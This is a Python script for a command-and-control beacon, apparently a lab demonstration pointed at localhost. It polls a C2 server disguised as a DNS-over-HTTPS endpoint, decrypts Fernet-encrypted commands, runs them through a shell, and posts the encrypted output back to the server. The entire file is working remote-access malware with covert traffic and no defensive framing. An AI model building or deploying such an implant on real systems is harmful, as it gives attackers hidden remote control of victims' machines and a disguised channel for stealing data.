import requests
import subprocess
import time
import base64
from cryptography.fernet import Fernet

C2_URL = "http://localhost:5000/dns-query"
KEY = "Use the relevant key"
fernet = Fernet(KEY)

NO_PROXY = {"http": None, "https": None}

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except Exception as e:
        return str(e)

while True:
    try:
        print("[*] Sending Beacon via DNS-over-HTTPS (DoH)...")
        response = requests.get(C2_URL, proxies=NO_PROXY)
        dns_data = response.json()
        
        if "Answer" in dns_data:
            encoded_cmd = dns_data["Answer"]["data"].strip('"')

            if encoded_cmd and encoded_cmd != "NONE":
                print(f"[!] Executing Encrypted Command...")
                encrypted_cmd = base64.b64decode(encoded_cmd)
                cmd = fernet.decrypt(encrypted_cmd).decode()

                if cmd != "NONE":
                    print(f"[!] Running command: {cmd}")
                    cmd_output = execute_command(cmd)
                    
                    encrypted_output = fernet.encrypt(cmd_output.encode())
                    encoded_output = base64.b64encode(encrypted_output).decode()
                    
                    requests.post("http://localhost:5000/results", json={"output": encoded_output}, proxies=NO_PROXY)
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    time.sleep(5)
